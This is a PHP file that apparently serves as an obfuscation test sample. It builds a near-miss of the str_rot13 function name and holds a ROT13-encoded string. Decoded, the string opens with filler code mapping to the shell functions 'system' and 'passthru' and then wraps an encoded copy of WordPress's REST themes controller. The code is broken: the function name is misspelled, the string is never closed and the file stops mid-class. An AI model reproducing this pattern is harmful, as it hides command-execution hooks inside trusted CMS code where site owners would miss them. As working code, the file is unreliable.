<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Gurzrf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 */

/**
 * Pber pynff hfrq gb znantr gurzrf ivn gur ERFG NCV.
 *
 * @fvapr 5.0.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Gurzrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Zngpurf gurzr'f qverpgbel: `/gurzrf/<fhoqverpgbel>/<gurzr>/` be `/gurzrf/<gurzr>/`.
	 * Rkpyhqrf vainyvq qverpgbel anzr punenpgref: `/:<>*?\"|`.
	 */
	pbafg CNGGREA = '[^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?';

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'gurzrf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gurzrf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			fcevags( '/%f/(?C<fglyrfurrg>%f)', $guvf->erfg_onfr, frys::CNGGREA ),
			neenl(
				'netf'   => neenl(
					'fglyrfurrg' => neenl(
						'qrfpevcgvba'       => __( \"Gur gurzr'f fglyrfurrg. Guvf havdhryl vqragvsvrf gur gurzr.\" ),
						'glcr'              => 'fgevat',
						'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_fglyrfurrg_pnyyonpx' ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Fnavgvmr gur fglyrfurrg gb qrpbqr raqcbvag.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $fglyrfurrg Gur fglyrfurrg anzr.
	 * @erghea fgevat Fnavgvmrq fglyrfurrg.
	 */
	choyvp shapgvba _fnavgvmr_fglyrfurrg_pnyyonpx( $fglyrfurrg ) {
		erghea heyqrpbqr( $fglyrfurrg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq gur gurzr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) || pheerag_hfre_pna( 'znantr_argjbex_gurzrf' ) ) {
			erghea gehr;
		}

		$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();
		vs ( vffrg( $ertvfgrerq['fgnghf'], $erdhrfg['fgnghf'] ) && vf_neenl( $erdhrfg['fgnghf'] ) && neenl( 'npgvir' ) === $erdhrfg['fgnghf'] ) {
			erghea $guvf->purpx_ernq_npgvir_gurzr_crezvffvba();
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj_gurzrf',
			__( 'Fbeel, lbh ner abg nyybjrq gb ivrj gurzrf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq gur gurzr.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) || pheerag_hfre_pna( 'znantr_argjbex_gurzrf' ) ) {
			erghea gehr;
		}

		$jc_gurzr      = jc_trg_gurzr( $erdhrfg['fglyrfurrg'] );
		$pheerag_gurzr = jc_trg_gurzr();

		vs ( $guvf->vf_fnzr_gurzr( $jc_gurzr, $pheerag_gurzr ) ) {
			erghea $guvf->purpx_ernq_npgvir_gurzr_crezvffvba();
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj_gurzrf',
			__( 'Fbeel, lbh ner abg nyybjrq gb ivrj gurzrf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Purpxf vs n gurzr pna or ernq.
	 *
	 * @fvapr 5.7.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur gurzr pna or ernq, JC_Reebe bowrpg bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_ernq_npgvir_gurzr_crezvffvba() {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj_npgvir_gurzr',
			__( 'Fbeel, lbh ner abg nyybjrq gb ivrj gur npgvir gurzr.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Ergevrirf n fvatyr gurzr.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$jc_gurzr = jc_trg_gurzr( $erdhrfg['fglyrfurrg'] );
		vs ( ! $jc_gurzr->rkvfgf() ) {
			erghea arj JC_Reebe(
				'erfg_gurzr_abg_sbhaq',
				__( 'Gurzr abg sbhaq.' ),
				neenl( 'fgnghf' => 404 )
			);
		}
		$qngn = $guvf->cercner_vgrz_sbe_erfcbafr( $jc_gurzr, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Ergevrirf n pbyyrpgvba bs gurzrf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$gurzrf = neenl();

		$npgvir_gurzrf = jc_trg_gurzrf();
		$pheerag_gurzr = jc_trg_gurzr();
		$fgnghf        = $erdhrfg['fgnghf'];

		sbernpu ( $npgvir_gurzrf nf $gurzr ) {
			$gurzr_fgnghf = ( $guvf->vf_fnzr_gurzr( $gurzr, $pheerag_gurzr ) ) ? 'npgvir' : 'vanpgvir';
			vs ( vf_neenl( $fgnghf ) && ! va_neenl( $gurzr_fgnghf, $fgnghf, gehr ) ) {
				pbagvahr;
			}

			$cercnerq = $guvf->cercner_vgrz_sbe_erfcbafr( $gurzr, $erdhrfg );
			$gurzrf[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $cercnerq );
		}

		$erfcbafr = erfg_rafher_erfcbafr( $gurzrf );

		$erfcbafr->urnqre( 'K-JC-Gbgny', pbhag( $gurzrf ) );
		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', 1 );

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n fvatyr gurzr bhgchg sbe erfcbafr.
	 *
	 * @fvapr 5.0.0
	 * @fvapr 5.9.0 Eranzrq `$gurzr` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 * @fvapr 6.6.0 Nqqrq `fglyrfurrg_hev` naq `grzcyngr_hev` svryqf.
	 *
	 * @cnenz JC_Gurzr        $vgrz    Gurzr bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gurzr = $vgrz;

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'fglyrfurrg', $svryqf ) ) {
			$qngn['fglyrfurrg'] = $gurzr->trg_fglyrfurrg();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'grzcyngr', $svryqf ) ) {
			/**
			 * Hfr gur trg_grzcyngr() zrgubq, abg gur 'Grzcyngr' urnqre, sbe svaqvat gur grzcyngr.
			 * Gur 'Grzcyngr' urnqre vf bayl tbbq sbe jung jnf jevggra va gur fglyr.pff, juvyr
			 * trg_grzcyngr() gnxrf vagb nppbhag jurer JbeqCerff npghnyyl ybpngrq gur gurzr naq
			 * jurgure vg vf npghnyyl inyvq.
			 */
			$qngn['grzcyngr'] = $gurzr->trg_grzcyngr();
		}

		$cynva_svryq_znccvatf = neenl(
			'erdhverf_cuc' => 'ErdhverfCUC',
			'erdhverf_jc'  => 'ErdhverfJC',
			'grkgqbznva'   => 'GrkgQbznva',
			'irefvba'      => 'Irefvba',
		);

		sbernpu ( $cynva_svryq_znccvatf nf $svryq => $urnqre ) {
			vs ( erfg_vf_svryq_vapyhqrq( $svryq, $svryqf ) ) {
				$qngn[ $svryq ] = $gurzr->trg( $urnqre );
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fperrafubg', $svryqf ) ) {
			// Hfvat $gurzr->trg_fperrafubg() jvgu ab netf gb trg nofbyhgr HEY.
			$qngn['fperrafubg'] = $gurzr->trg_fperrafubg() ? $gurzr->trg_fperrafubg() : '';
		}

		$evpu_svryq_znccvatf = neenl(
			'nhgube'      => 'Nhgube',
			'nhgube_hev'  => 'NhgubeHEV',
			'qrfpevcgvba' => 'Qrfpevcgvba',
			'anzr'        => 'Anzr',
			'gntf'        => 'Gntf',
			'gurzr_hev'   => 'GurzrHEV',
		);

		sbernpu ( $evpu_svryq_znccvatf nf $svryq => $urnqre ) {
			vs ( erfg_vf_svryq_vapyhqrq( \"{$svryq}.enj\", $svryqf ) ) {
				$qngn[ $svryq ]['enj'] = $gurzr->qvfcynl( $urnqre, snyfr, gehr );
			}

			vs ( erfg_vf_svryq_vapyhqrq( \"{$svryq}.eraqrerq\", $svryqf ) ) {
				$qngn[ $svryq ]['eraqrerq'] = $gurzr->qvfcynl( $urnqre );
			}
		}

		$pheerag_gurzr = jc_trg_gurzr();
		vs ( erfg_vf_svryq_vapyhqrq( 'fgnghf', $svryqf ) ) {
			$qngn['fgnghf'] = ( $guvf->vf_fnzr_gurzr( $gurzr, $pheerag_gurzr ) ) ? 'npgvir' : 'vanpgvir';
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gurzr_fhccbegf', $svryqf ) && $guvf->vf_fnzr_gurzr( $gurzr, $pheerag_gurzr ) ) {
			sbernpu ( trg_ertvfgrerq_gurzr_srngherf() nf $srngher => $pbasvt ) {
				vs ( ! vf_neenl( $pbasvt['fubj_va_erfg'] ) ) {
					pbagvahr;
				}

				$anzr = $pbasvt['fubj_va_erfg']['anzr'];

				vs ( ! erfg_vf_svryq_vapyhqrq( \"gurzr_fhccbegf.{$anzr}\", $svryqf ) ) {
					pbagvahr;
				}

				vs ( ! pheerag_gurzr_fhccbegf( $srngher ) ) {
					$qngn['gurzr_fhccbegf'][ $anzr ] = $pbasvt['fubj_va_erfg']['fpurzn']['qrsnhyg'];
					pbagvahr;
				}

				$fhccbeg = trg_gurzr_fhccbeg( $srngher );

				vs ( vffrg( $pbasvt['fubj_va_erfg']['cercner_pnyyonpx'] ) ) {
					$cercner = $pbasvt['fubj_va_erfg']['cercner_pnyyonpx'];
				} ryfr {
					$cercner = neenl( $guvf, 'cercner_gurzr_fhccbeg' );
				}

				$cercnerq = $cercner( $fhccbeg, $pbasvt, $srngher, $erdhrfg );

				vs ( vf_jc_reebe( $cercnerq ) ) {
					pbagvahr;
				}

				$qngn['gurzr_fhccbegf'][ $anzr ] = $cercnerq;
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'vf_oybpx_gurzr', $svryqf ) ) {
			$qngn['vf_oybpx_gurzr'] = $gurzr->vf_oybpx_gurzr();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fglyrfurrg_hev', $svryqf ) ) {
			vs ( $guvf->vf_fnzr_gurzr( $gurzr, $pheerag_gurzr ) ) {
				$qngn['fglyrfurrg_hev'] = trg_fglyrfurrg_qverpgbel_hev();
			} ryfr {
				$qngn['fglyrfurrg_hev'] = $gurzr->trg_fglyrfurrg_qverpgbel_hev();
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'grzcyngr_hev', $svryqf ) ) {
			vs ( $guvf->vf_fnzr_gurzr( $gurzr, $pheerag_gurzr ) ) {
				$qngn['grzcyngr_hev'] = trg_grzcyngr_qverpgbel_hev();
			} ryfr {
				$qngn['grzcyngr_hev'] = $gurzr->trg_grzcyngr_qverpgbel_hev();
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qrsnhyg_grzcyngr_glcrf', $svryqf ) && $guvf->vf_fnzr_gurzr( $gurzr, $pheerag_gurzr ) ) {
			$qrsnhyg_grzcyngr_glcrf = neenl();
			sbernpu ( trg_qrsnhyg_oybpx_grzcyngr_glcrf() nf $fyht => $grzcyngr_glcr ) {
				$grzcyngr_glcr['fyht']    = (fgevat) $fyht;
				$qrsnhyg_grzcyngr_glcrf[] = $grzcyngr_glcr;
			}
			$qngn['qrsnhyg_grzcyngr_glcrf'] = $qrsnhyg_grzcyngr_glcrf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qrsnhyg_grzcyngr_cneg_nernf', $svryqf ) && $guvf->vf_fnzr_gurzr( $gurzr, $pheerag_gurzr ) ) {
			$qngn['qrsnhyg_grzcyngr_cneg_nernf'] = trg_nyybjrq_oybpx_grzcyngr_cneg_nernf();
		}

		$qngn = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $gurzr ) );
		}

		/**
		 * Svygref gurzr qngn erghearq sebz gur ERFG NCV.
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Gurzr         $gurzr    Gurzr bowrpg hfrq gb perngr erfcbafr.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_gurzr', $erfcbafr, $gurzr, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz JC_Gurzr $gurzr Gurzr qngn.
	 * @erghea neenl Yvaxf sbe gur tvira oybpx glcr.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $gurzr ) {
		$yvaxf = neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $gurzr->trg_fglyrfurrg() ) ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
		);

		vs ( $guvf->vf_fnzr_gurzr( $gurzr, jc_trg_gurzr() ) ) {
			// Guvf perngrf n erpbeq sbe gur npgvir gurzr vs abg rkvfgrag.
			$vq = JC_Gurzr_WFBA_Erfbyire::trg_hfre_tybony_fglyrf_cbfg_vq();
		} ryfr {
			$hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
			$vq       = vffrg( $hfre_pcg['VQ'] ) ? $hfre_pcg['VQ'] : ahyy;
		}

		vs ( $vq ) {
			$yvaxf['uggcf://ncv.j.bet/hfre-tybony-fglyrf'] = neenl(
				'uers' => erfg_hey( 'jc/i2/tybony-fglyrf/' . $vq ),
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Urycre shapgvba gb pbzcner gjb gurzrf.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz JC_Gurzr $gurzr_n Svefg gurzr gb pbzcner.
	 * @cnenz JC_Gurzr $gurzr_o Frpbaq gurzr gb pbzcner.
	 * @erghea obby
	 */
	cebgrpgrq shapgvba vf_fnzr_gurzr( $gurzr_n, $gurzr_o ) {
		erghea $gurzr_n->trg_fglyrfurrg() === $gurzr_o->trg_fglyrfurrg();
	}

	/**
	 * Cercnerf gur gurzr fhccbeg inyhr sbe vapyhfvba va gur ERFG NCV erfcbafr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz zvkrq           $fhccbeg Gur enj inyhr sebz trg_gurzr_fhccbeg().
	 * @cnenz neenl           $netf    Gur srngher'f ertvfgengvba netf.
	 * @cnenz fgevat          $srngher Gur srngher anzr.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg bowrpg.
	 * @erghea zvkrq Gur cercnerq fhccbeg inyhr.
	 */
	cebgrpgrq shapgvba cercner_gurzr_fhccbeg( $fhccbeg, $netf, $srngher, $erdhrfg ) {
		$fpurzn = $netf['fubj_va_erfg']['fpurzn'];

		vs ( 'obbyrna' === $fpurzn['glcr'] ) {
			erghea gehr;
		}

		vs ( vf_neenl( $fhccbeg ) && ! $netf['inevnqvp'] ) {
			$fhccbeg = $fhccbeg[0];
		}

		erghea erfg_fnavgvmr_inyhr_sebz_fpurzn( $fhccbeg, $fpurzn );
	}

	/**
	 * Ergevrirf gur gurzr'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'gurzr',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'fglyrfurrg'                  => neenl(
					'qrfpevcgvba' => __( 'Gur gurzr\'f fglyrfurrg. Guvf havdhryl vqragvsvrf gur gurzr.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
				),
				'fglyrfurrg_hev'              => neenl(
					'qrfpevcgvba' => __( 'Gur hev sbe gur gurzr\'f fglyrfurrg qverpgbel.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'ernqbayl'    => gehr,
				),
				'grzcyngr'                    => neenl(
					'qrfpevcgvba' => __( 'Gur gurzr\'f grzcyngr. Vs guvf vf n puvyq gurzr, guvf ersref gb gur cnerag gurzr, bgurejvfr guvf vf gur fnzr nf gur gurzr\'f fglyrfurrg.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
				),
				'grzcyngr_hev'                => neenl(
					'qrfpevcgvba' => __( 'Gur hev sbe gur gurzr\'f grzcyngr qverpgbel. Vs guvf vf n puvyq gurzr, guvf ersref gb gur cnerag gurzr, bgurejvfr guvf vf gur fnzr nf gur gurzr\'f fglyrfurrg qverpgbel.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'ernqbayl'    => gehr,
				),
				'nhgube'                      => neenl(
					'qrfpevcgvba' => __( 'Gur gurzr nhgube.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr nhgube\'f anzr, nf sbhaq va gur gurzr urnqre.' ),
							'glcr'        => 'fgevat',
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'UGZY sbe gur gurzr nhgube, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
						),
					),
				),
				'nhgube_hev'                  => neenl(
					'qrfpevcgvba' => __( 'Gur jrofvgr bs gur gurzr nhgube.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gur jrofvgr bs gur gurzr nhgube, nf sbhaq va gur gurzr urnqre.' ),
							'glcr'        => 'fgevat',
							'sbezng'      => 'hev',
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'Gur jrofvgr bs gur gurzr nhgube, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
							'sbezng'      => 'hev',
						),
					),
				),
				'qrfpevcgvba'                 => neenl(
					'qrfpevcgvba' => __( 'N qrfpevcgvba bs gur gurzr.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr qrfpevcgvba, nf sbhaq va gur gurzr urnqre.' ),
							'glcr'        => 'fgevat',
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr qrfpevcgvba, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
						),
					),
				),
				'vf_oybpx_gurzr'              => neenl(
					'qrfpevcgvba' => __( 'Jurgure gur gurzr vf n oybpx-onfrq gurzr.' ),
					'glcr'        => 'obbyrna',
					'ernqbayl'    => gehr,
				),
				'anzr'                        => neenl(
					'qrfpevcgvba' => __( 'Gur anzr bs gur gurzr.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr anzr, nf sbhaq va gur gurzr urnqre.' ),
							'glcr'        => 'fgevat',
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr anzr, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
						),
					),
				),
				'erdhverf_cuc'                => neenl(
					'qrfpevcgvba' => __( 'Gur zvavzhz CUC irefvba erdhverq sbe gur gurzr gb jbex.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
				),
				'erdhverf_jc'                 => neenl(
					'qrfpevcgvba' => __( 'Gur zvavzhz JbeqCerff irefvba erdhverq sbe gur gurzr gb jbex.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
				),
				'fperrafubg'                  => neenl(
					'qrfpevcgvba' => __( 'Gur gurzr\'f fperrafubg HEY.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'ernqbayl'    => gehr,
				),
				'gntf'                        => neenl(
					'qrfpevcgvba' => __( 'Gntf vaqvpngvat fglyrf naq srngherf bs gur gurzr.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr gntf, nf sbhaq va gur gurzr urnqre.' ),
							'glcr'        => 'neenl',
							'vgrzf'       => neenl(
								'glcr' => 'fgevat',
							),
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr gntf, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
						),
					),
				),
				'grkgqbznva'                  => neenl(
					'qrfpevcgvba' => __( 'Gur gurzr\'f grkg qbznva.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
				),
				'gurzr_fhccbegf'              => neenl(
					'qrfpevcgvba' => __( 'Srngherf fhccbegrq ol guvf gurzr.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(),
				),
				'gurzr_hev'                   => neenl(
					'qrfpevcgvba' => __( 'Gur HEV bs gur gurzr\'f jrocntr.' ),
					'glcr'        => 'bowrpg',
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gur HEV bs gur gurzr\'f jrocntr, nf sbhaq va gur gurzr urnqre.' ),
							'glcr'        => 'fgevat',
							'sbezng'      => 'hev',
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'Gur HEV bs gur gurzr\'f jrocntr, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
							'sbezng'      => 'hev',
						),
					),
				),
				'irefvba'                     => neenl(
					'qrfpevcgvba' => __( 'Gur gurzr\'f pheerag irefvba.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
				),
				'fgnghf'                      => neenl(
					'qrfpevcgvba' => __( 'N anzrq fgnghf sbe gur gurzr.' ),
					'glcr'        => 'fgevat',
					'rahz'        => neenl( 'vanpgvir', 'npgvir' ),
				),
				'qrsnhyg_grzcyngr_glcrf'      => neenl(
					'qrfpevcgvba' => __( 'N yvfg bs qrsnhyg grzcyngr glcrf.' ),
					'glcr'        => 'neenl',
					'ernqbayl'    => gehr,
					'vgrzf'       => neenl(
						'glcr'       => 'bowrpg',
						'cebcregvrf' => neenl(
							'fyht'        => neenl(
								'glcr' => 'fgevat',
							),
							'gvgyr'       => neenl(
								'glcr' => 'fgevat',
							),
							'qrfpevcgvba' => neenl(
								'glcr' => 'fgevat',
							),
						),
					),
				),
				'qrsnhyg_grzcyngr_cneg_nernf' => neenl(
					'qrfpevcgvba' => __( 'N yvfg bs nyybjrq nern inyhrf sbe grzcyngr cnegf.' ),
					'glcr'        => 'neenl',
					'ernqbayl'    => gehr,
					'vgrzf'       => neenl(
						'glcr'       => 'bowrpg',
						'cebcregvrf' => neenl(
							'nern'        => neenl(
								'glcr' => 'fgevat',
							),
							'ynory'       => neenl(
								'glcr' => 'fgevat',
							),
							'qrfpevcgvba' => neenl(
								'glcr' => 'fgevat',
							),
							'vpba'        => neenl(
								'glcr' => 'fgevat',
							),
							'nern_gnt'    => neenl(
								'glcr' => 'fgevat',
							),
						),
					),
				),
			),
		);

		sbernpu ( trg_ertvfgrerq_gurzr_srngherf() nf $srngher => $pbasvt ) {
			vs ( ! vf_neenl( $pbasvt['fubj_va_erfg'] ) ) {
				pbagvahr;
			}

			$anzr = $pbasvt['fubj_va_erfg']['anzr'];

			$fpurzn['cebcregvrf']['gurzr_fhccbegf']['cebcregvrf'][ $anzr ] = $pbasvt['fubj_va_erfg']['fpurzn'];
		}

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur frnepu cnenzf sbe gur gurzrf pbyyrpgvba.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = neenl(
			'fgnghf' => neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb gurzrf nffvtarq bar be zber fgnghfrf.' ),
				'glcr'        => 'neenl',
				'vgrzf'       => neenl(
					'rahz' => neenl( 'npgvir', 'vanpgvir' ),
					'glcr' => 'fgevat',
				),
			),
		);

		/**
		 * Svygref ERFG NCV pbyyrpgvba cnenzrgref sbe gur gurzrf pbagebyyre.
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz neenl $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 */
